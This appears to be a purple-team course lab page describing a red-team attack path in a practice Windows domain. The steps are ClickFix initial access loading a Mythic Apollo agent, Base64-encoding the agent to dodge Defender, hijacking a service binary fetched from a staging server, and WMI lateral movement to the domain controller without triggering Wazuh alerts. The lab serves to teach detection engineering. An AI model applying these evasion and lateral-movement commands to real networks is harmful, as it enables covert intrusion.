---
layout: default
title: "Red Team Engage - Lateral Movement"
permalink: /solo-purple-teaming/red-team-engage-lateral-movement/
---
<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>Red Team Engage - Lateral Movement</h1>
</section>
<section class="spt-content">
<h2 id="overview"><strong>Overview</strong></h2>
<p>In this exercise, we will:</p>
<ol type="1">
<li>Re-engage Level 1 attack path.</li>
<li>Perform initial access using the ClickFix TTP via the Run
dialogue.</li>
<li>Enumerate services with a custom <strong>Service Scan
Utility</strong>.</li>
<li>Privilege escalate by bypassing our last detection from the previous
lecture.</li>
<li>Laterally move to the Domain Controller (DC) using WMI.</li>
<li>Validate that no detections are triggered in Wazuh.</li>
</ol>
<hr />
<h2 id="1-initial-access"><strong>1. Initial Access</strong></h2>
<ul>
<li><strong>TTP Used:</strong> ClickFix via <strong>Run
dialogue</strong> to execute a PowerShell command that reflectively
loads the Apollo agent.</li>
<li><strong>Process:</strong>
<ol type="1">
<li>Open the <strong>Run box</strong>.</li>
<li>Paste and execute the PowerShell one-liner to load Apollo into
memory.</li>
<li>In Mythic, interact with the new callback.</li>
<li>Change the tab description to
<code>Initial Access - Arlen</code>.</li>
</ol></li>
</ul>
<hr />
<h2 id="2-register-service-scan-utility"><strong>2. Register Service
Scan Utility</strong></h2>
<ul>
<li><strong>Why:</strong> We’ll need it for enumeration without writing
to disk.</li>
<li><strong>Steps:</strong>
<ol type="1">
<li><p>In <strong>Windows RE</strong> session, run:</p>
register assembly
</li>
<li><p>Use the modal to upload
<code>service_scan_demo.exe</code>.</p></li>
<li><p>In Mythic, set <strong>Injection Technique</strong>:</p>
<ul>
<li><code>syscall_x64.ntcreatethreadex</code></li>
</ul></li>
<li><p>Set <strong>Spawn To</strong>:</p>
<ul>
<li>Use modal → set to <code>smartscreen</code>.</li>
</ul></li>
<li><p>Execute the assembly:</p>
execute assembly service_scan_demo.exe
</li>
<li><p>Verify in Wazuh dashboard → no detections.</p></li>
<li><p>Check assume breach host → confirm Defender doesn’t flag
it.</p></li>
</ol></li>
</ul>
<hr />
<h2 id="3-enumeration"><strong>3. Enumeration</strong></h2>
<ul>
<li><p>Service scan results reveal the vulnerable service.</p></li>
<li><p>Navigate to target directory:</p>
<div class="sourceCode" id="cb3"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cd</span> C<span class="op">:</span>\Users\Arlen\Desktop</span></code></pre></div></li>
<li><p>Rename existing service binary:</p>
<div class="sourceCode" id="cb4"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Rename-Item</span> ecoin_sync<span class="op">.</span><span class="fu">exe</span> ecoin_sync<span class="op">.</span><span class="fu">bak</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span></span></code></pre></div>
<p>Confirm rename was successful.</p></li>
</ul>
<hr />
<h2 id="4-privilege-escalation--bypass"><strong>4. Privilege Escalation
&amp; Bypass</strong></h2>
<h3 id="problem-from-last-lecture"><strong>Problem from Last
Lecture</strong></h3>
<ul>
<li>Directly running Apollo from user directories (e.g., Downloads,
Desktop) triggered Defender.</li>
<li>Reflection from these locations was also detected.</li>
<li>Writing to
<strong><code>C:\Windows\System32\spool\drivers\color</code></strong>
was possible but Defender flags <code>.exe</code> files here.</li>
</ul>
<h3 id="bypass-solution"><strong>Bypass Solution</strong></h3>
<ol type="1">
<li><strong>Encode Apollo Agent:</strong>
<ul>
<li>Open <strong>CyberChef</strong>.</li>
<li>Upload Apollo binary → confirm MZ header.</li>
<li>Convert to Base64 → save as <code>apollo.dat</code>.</li>
</ul></li>
<li><strong>Transfer Encoded File:</strong>
<ul>
<li>Use SCP to send <code>apollo.dat</code> to staging server.</li>
<li>Pull it to the target directory with the agent.</li>
</ul></li>
<li><strong>Modify Ecoin Sync Service Binary:</strong>
<ul>
<li>Read <code>apollo.dat</code>.</li>
<li>Convert Base64 → bytes.</li>
<li>Use reflection (<code>AppDomain.CurrentDomain.Load</code>) to load
and execute the binary from memory.</li>
</ul></li>
<li><strong>Deploy:</strong>
<ul>
<li><p>Build modified service binary.</p></li>
<li><p>SCP to staging server.</p></li>
<li><p>Use PowerShell IWR to download:</p>
<div class="sourceCode" id="cb5"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Invoke-WebRequest</span> http<span class="op">://</span><span class="dv">192.168</span><span class="op">.</span><span class="dv">100.101</span><span class="op">:</span><span class="dv">8000</span><span class="op">/</span>ecoin_sync<span class="op">.</span><span class="fu">exe</span> <span class="op">-</span>OutFile ecoin_sync<span class="op">.</span><span class="fu">exe</span></span></code></pre></div></li>
<li><p>Start the service (ensure correct name).</p></li>
<li><p>Verify <strong>new high-integrity callback</strong> as
<code>SVC_ecoin_sync</code>.</p></li>
</ul></li>
</ol>
<hr />
<h2 id="5-domain-admin-verification"><strong>5. Domain Admin
Verification</strong></h2>
<ul>
<li><p>Check group membership:</p>
shell net user SVC_ecoin_sync /domain
</li>
<li><p>Confirm membership in <strong>Domain Admins</strong>.</p></li>
</ul>
<hr />
<h2 id="6-lateral-movement-to-domain-controller"><strong>6. Lateral
Movement to Domain Controller</strong></h2>
<ul>
<li><p>Identify DC:</p>
shell nltest /dsgetdc:ecoin
</li>
<li><p>Use <strong>jump wmi</strong> in Mythic:</p>
jump wmi 10.0.2.2

<ul>
<li>Builds Apollo WinExe.</li>
<li>Copies to admin share.</li>
<li>Executes remotely.</li>
</ul></li>
<li><p>Interact with the new callback from DC.</p></li>
<li><p>Verify:</p>
shell hostname

<p>Confirm <code>ecoin-DC1</code>.</p></li>
</ul>
<hr />
<h2 id="7-detection-check"><strong>7. Detection Check</strong></h2>
<ul>
<li>Open Wazuh dashboard → verify <strong>no alerts</strong>.</li>
<li>Success: Bypassed all custom detections.</li>
</ul>
<hr />
<h2 id="8-student-challenge"><strong>8. Student Challenge</strong></h2>
<ul>
<li>Recreate the lateral movement to DC <strong>without
detection</strong>.</li>
<li>Find your own bypass for the last detection.</li>
<li>Prepare for the next lecture where we will <strong>switch to blue
team mode</strong> and build new detections for these updated TTPs.</li>
</ul>
</section>
</div>
